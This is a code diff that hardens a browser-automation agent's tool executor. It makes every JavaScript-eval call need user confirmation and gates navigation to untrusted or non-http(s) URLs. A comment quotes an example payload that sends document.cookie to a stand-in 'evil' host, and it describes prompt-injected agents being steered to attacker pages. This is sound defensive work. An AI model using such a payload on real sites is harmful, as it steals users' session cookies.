@@ -48,7 +48,9 @@ export const pendingToolCalls = new Map<string, {
   timer: NodeJS.Timeout
 }>()
 
-const securityConfirmations = new SecurityConfirmationManager()
+// Exported for integration tests (audit item 2 / 12) so tests can drive
+// securityConfirmations.respond(...) when simulating user approval/denial.
+export const securityConfirmations = new SecurityConfirmationManager()
 const LOG_LEVELS = new Set<LogLevel>(["debug", "info", "warn", "error"])
 
 function safeLogLevel(level: unknown): LogLevel {
@@ -169,51 +171,131 @@ export function createToolExecutor(ws: WebSocket) {
         logToolFinish(toolCallId, toolName, startedAt, result)
         return result
       }
+      // Audit item 2: default-deny. ALL evaluate/osascript_eval calls require
+      // interactive confirmation. The regex match (safety.dangerousApis) becomes
+      // a risk-preview escalation hint shown to the user — it no longer gates
+      // WHETHER to confirm, only HOW SCARY the preview looks. The previous model
+      // (confirm only when regex matched) was trivially bypassable via patterns
+      // like `location.assign('https://evil/?'+document.cookie)` that exfiltrate
+      // cookies without triggering any regex flag.
       const safety = checkHighRiskExecution(toolName, code)
-      if (safety.blocked) {
+      if (ws.readyState !== WebSocket.OPEN) {
+        const result = {
+          success: false,
+          error: highRiskExecutionDeniedError(toolName, safety.dangerousApis, "unavailable"),
+          data: { dangerous_apis_found: safety.dangerousApis },
+        }
+        logToolFinish(toolCallId, toolName, startedAt, result)
+        return result
+      }
+      logger.warn("security.confirmation.requested", {
+        tool_call_id: toolCallId,
+        tool_name: toolName,
+        dangerous_apis: safety.dangerousApis,
+      })
+      const token = securityPolicy.issueToken(toolName, code)
+      const decision = await securityConfirmations.request(
+        (data) => {
+          if (ws.readyState === WebSocket.OPEN) {
+            ws.send(JSON.stringify(data))
+          }
+        },
+        { toolName, dangerousApis: safety.dangerousApis, code },
+      )
+      if (!decision.approved) {
+        const reason = decision.reason === "approved" ? "unavailable" : decision.reason
+        const result = {
+          success: false,
+          error: highRiskExecutionDeniedError(toolName, safety.dangerousApis, reason),
+          data: { dangerous_apis_found: safety.dangerousApis },
+        }
+        logger.warn("security.confirmation.denied", {
+          tool_call_id: toolCallId,
+          tool_name: toolName,
+          reason,
+          dangerous_apis: safety.dangerousApis,
+        })
+        logToolFinish(toolCallId, toolName, startedAt, result)
+        return result
+      }
+      logger.info("security.confirmation.approved", { tool_call_id: toolCallId, tool_name: toolName })
+      // Issue a new token post-approval; the extension will validate it
+      const approvedToken = securityPolicy.issueToken(toolName, code)
+      finalParams = { ...finalParams, security_token: approvedToken.token }
+      void token // pre-approval token reserved for future use; current flow re-issues post-approval
+    }
+
+    // Audit item 12: navigate / create_tab trust-domain gate. Agents can otherwise
+    // drive the browser to ANY URL (including chrome://, file://, data:, or attacker
+    // domains) with no confirmation — a credential-phishing / internal-page-pivot
+    // vector via prompt injection. Require confirmation for URLs whose host is not
+    // in trusted_domains; block non-http(s) schemes outright.
+    const URL_GATE_TOOLS = ["navigate", "create_tab", "set_tab_url"]
+    if (URL_GATE_TOOLS.includes(toolName)) {
+      const rawUrl = String(finalParams.url || "")
+      let parsedUrl: URL | null = null
+      try { parsedUrl = new URL(rawUrl) } catch { /* invalid URL — handled below */ }
+      if (!parsedUrl || !rawUrl) {
+        const result = { success: false, error: `Invalid URL for ${toolName}: ${rawUrl}` }
+        logToolFinish(toolCallId, toolName, startedAt, result)
+        return result
+      }
+      // Block non-http(s) schemes outright. chrome://, file://, data:, javascript:
+      // are off-limits regardless of trust.
+      if (parsedUrl.protocol !== "http:" && parsedUrl.protocol !== "https:") {
+        const result = {
+          success: false,
+          error: `Security Block: ${toolName} to ${parsedUrl.protocol} scheme is not allowed. Only http/https URLs are permitted.`,
+        }
+        logger.warn("security.url_scheme_blocked", { tool_call_id: toolCallId, tool_name: toolName, scheme: parsedUrl.protocol })
+        logToolFinish(toolCallId, toolName, startedAt, result)
+        return result
+      }
+      // If host is in trusted_domains, allow without confirmation (same trust tier
+      // as cookie tools).
+      if (!isTrustedDomain(parsedUrl.hostname)) {
         if (ws.readyState !== WebSocket.OPEN) {
           const result = {
             success: false,
-            error: highRiskExecutionDeniedError(toolName, safety.dangerousApis, "unavailable"),
-            data: { dangerous_apis_found: safety.dangerousApis },
+            error: `Security Block: ${toolName} to untrusted domain "${parsedUrl.hostname}" requires user confirmation, but the WebSocket is not connected.`,
           }
           logToolFinish(toolCallId, toolName, startedAt, result)
           return result
         }
-        logger.warn("security.confirmation.requested", {
+        logger.warn("security.url_confirmation.requested", {
           tool_call_id: toolCallId,
           tool_name: toolName,
-          dangerous_apis: safety.dangerousApis,
+          url: rawUrl,
+          host: parsedUrl.hostname,
         })
-        const token = securityPolicy.issueToken(toolName, code)
         const decision = await securityConfirmations.request(
           (data) => {
             if (ws.readyState === WebSocket.OPEN) {
               ws.send(JSON.stringify(data))
             }
           },
-          { toolName, dangerousApis: safety.dangerousApis, code },
+          {
+            toolName,
+            dangerousApis: [],
+            code: `navigate(${rawUrl})`,
+          },
         )
         if (!decision.approved) {
           const reason = decision.reason === "approved" ? "unavailable" : decision.reason
           const result = {
             success: false,
-            error: highRiskExecutionDeniedError(toolName, safety.dangerousApis, reason),
-            data: { dangerous_apis_found: safety.dangerousApis },
+            error: `Security Block: ${toolName} to "${rawUrl}" was ${reason === "denied" ? "denied by user" : reason}.`,
           }
-          logger.warn("security.confirmation.denied", {
+          logger.warn("security.url_confirmation.denied", {
             tool_call_id: toolCallId,
             tool_name: toolName,
+            url: rawUrl,
             reason,
-            dangerous_apis: safety.dangerousApis,
           })
           logToolFinish(toolCallId, toolName, startedAt, result)
           return result
         }
-        logger.info("security.confirmation.approved", { tool_call_id: toolCallId, tool_name: toolName })
-        // Issue a new token post-approval; the extension will validate it
-        const approvedToken = securityPolicy.issueToken(toolName, code)
-        finalParams = { ...finalParams, security_token: approvedToken.token }
+        logger.info("security.url_confirmation.approved", { tool_call_id: toolCallId, tool_name: toolName, url: rawUrl })
       }
     }
 
